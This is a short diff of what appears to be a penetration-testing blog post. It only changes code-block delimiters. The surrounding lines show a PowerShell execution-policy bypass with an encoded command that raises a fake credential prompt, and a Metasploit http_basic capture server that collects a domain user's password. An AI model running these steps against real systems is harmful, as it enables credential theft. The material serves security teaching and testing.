@@ -79,7 +79,7 @@ Then execute `powershell -ep bypass -enc <the encoded text from above>` and you 
 
 Image should be here: ![](/images/2014-09-03-powershellpopup.png)
 
-----
+....
 root@wpad:~/metasploit-framework# ./msfconsole -Lq
 msf > use auxiliary/server/capture/http_basic 
 msf auxiliary(http_basic) > show options
@@ -112,6 +112,6 @@ msf auxiliary(http_basic) >
 [*] Server started.
 [*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
 [+] 172.16.102.140 - Credential collected: "SITTINGDUCK\user:ASDqwe123" => /
-----
+....
 
 Game over!
